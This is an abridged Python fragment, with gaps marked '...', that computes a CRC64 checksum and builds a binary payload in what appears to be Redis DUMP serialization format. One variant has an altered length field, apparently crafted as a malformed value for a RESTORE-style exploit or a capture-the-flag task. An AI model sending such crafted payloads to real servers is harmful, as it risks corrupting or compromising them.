...
crc_table = [	0x0000000000000000,	0x7ad870c830358979,	
...
def crc_checksum(buffer, size, table=crc_table):
	crc = 0
	for i in range(size):
...
#payload = b"\x0e\x01\x1d\x1d\x00\x00\x00\x16\x00\x00\x00\x02\x00\x00\x04EFGH\x06\x04EEEE\x06\x04AAAA\xff" #DUMP key
payload  = b'\x0e\x01\x1d\x1d\x00\x00\x00\x16\x00\x00\x00\x03\x00\x00\x04CCCC\x06\x04BBBB\x06\x3fAAAA\xff'
payload  += pack('<H', RDB_VERSION)
payload  += pack('<Q', crc_checksum(payload, len(payload)))
print(payload)
